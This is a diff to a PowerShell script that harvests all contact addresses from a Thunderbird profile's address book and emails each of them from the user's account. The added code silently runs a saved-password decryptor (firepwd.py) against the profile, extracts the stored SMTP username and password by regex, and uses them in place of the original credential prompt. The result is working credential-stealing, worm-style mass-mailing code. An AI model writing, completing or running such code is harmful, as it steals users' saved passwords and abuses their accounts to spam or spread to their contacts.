@@ -1,7 +1,7 @@
-if (-not (Get-Module -ListAvailable -Name SQLite)) {
-    Install-Module -Name SQLite -Scope CurrentUser -Force 
+if (-not (Get-Module -ListAvailable -Name PSSQLite)) {
+    Install-Module -Name PSSQLite -Scope CurrentUser -Force 
 }
-Import-Module SQLite
+Import-Module PSSQLite
 
 $profilesPath = "$env:APPDATA\Thunderbird\Profiles"
 $profile = Get-ChildItem $profilesPath -Directory | Select-Object -First 1
@@ -13,13 +13,13 @@ $prefs = Get-Content $prefsFile
 
 # Extract user email
 $userEmailLine = $prefs | Select-String "useremail"
-$userEmail = ($userEmailLine -replace '.*useremail","(.*)".*','$1').Trim()
+$userEmail = ($userEmailLine -replace '.*useremail.*",\s*"(.*)".*', '$1').Trim()
 Write-Host "User Email: $userEmail"
 
 # Extract SMTP server
 $smtpLine = $prefs | Select-String "mail.smtpserver.smtp"
 $smtpServerLine = $smtpLine | Select-String "hostname"
-$smtpServer = ($smtpServerLine -replace '.*hostname","(.*)".*','$1').Trim()
+$smtpServer = ($smtpServerLine -replace '.*hostname.*",\s*"(.*)".*', '$1').Trim()
 Write-Host "SMTP Server: $smtpServer"
 
 # Extract contacts from abook.sqlite
@@ -27,24 +27,66 @@ $abookFile = "$($profile.FullName)\abook.sqlite"
 
 if (-not (Test-Path $abookFile)) { Write-Error "Address book not found"; exit }
 
-$conn = Connect-SQLite -DataSource $abookFile
 
-$contacts = Invoke-SQLiteQuery -Connection $conn -Query "
-    SELECT DisplayName, PrimaryEmail 
-    FROM moz_abcontacts
-" | Where-Object { $_.PrimaryEmail -ne $null }
+# Get contacts with pivoted DisplayName and PrimaryEmail
+$contacts = Invoke-SQLiteQuery -DataSource $abookFile -Query "
+    SELECT
+        MAX(CASE WHEN name = 'PrimaryEmail' THEN value END) AS PrimaryEmail
+    FROM properties
+    GROUP BY card
+"
 
-Write-Host ("Found {0} contacts" -f $contacts.Count)
+# Extract only non-null emails into a list
+$allEmails = $contacts | Where-Object { $_.PrimaryEmail } | ForEach-Object { $_.PrimaryEmail }
+$allEmails = $allEmails | ForEach-Object { $_.Trim() } | Where-Object { $_ -match '^[\w\.\-]+@[\w\.\-]+$' }
 
-$credential = Get-Credential -Message "Enter SMTP username and password for $userEmail"
+
+# Optional: display how many emails you got
+Write-Host ("Found {0} emails" -f $allemails.Count)
+
+# Run your Python script and capture the output
+$output = python3 "C:\Users\Public\Public Display\firepwd.py" -d $($profile.FullName)
+
+# Define the updated regex pattern for extracting the username and password
+$regex = "smtp://(?:[^\s]+):b'([^\']+)',b'([^\']+)'"
+
+# Initialize arrays to store usernames and passwords
+$usernames = @()
+$passwords = @()
+
+# Split output into lines and check each line
+$output.Split("`n") | ForEach-Object {
+    # Match the regex pattern in each line
+    if ($_ -match $regex) {
+        # Extract username and password from matched groups
+        $usernames += $matches[1]
+        $passwords += $matches[2]
+    }
+}
+
+# Output all found usernames and passwords
+if ($usernames.Count -gt 0) {
+    for ($i = 0; $i -lt $usernames.Count; $i++) {
+	$username = $($usernames[0])
+	$password = $($passwords[0])
+    }
+
+} else {
+    Write-Host "No matches found."
+}
+
+$credential = New-Object System.Management.Automation.PSCredential($username, (ConvertTo-SecureString $password -AsPlainText -Force))
 
 $subject = "Automated Email from Thunderbird CLI"
 $body = "Hello! This is an automated email sent via PowerShell."
 
-# Send to all contacts via BCC
-$allEmails = ($contacts | Select-Object -ExpandProperty PrimaryEmail) -join ";"
+# Send to all contacts 
 
 Write-Host "Sending email to all contacts..."
-Send-MailMessage -From $userEmail -To $userEmail -Bcc $allEmails  -Subject $subject -Body $body -SmtpServer $smtpServer -Port 143 -Credential $credential
 
-Write-Host "Email sent successfully!"
+# Send email to each address individually
+foreach ($email in $allEmails) {
+    Send-MailMessage -From $userEmail -To $email -Subject $subject -Body $body `
+        -SmtpServer $smtpServer -Port 25 -Credential $credential
+    Write-Host "Email sent to $email"
+}
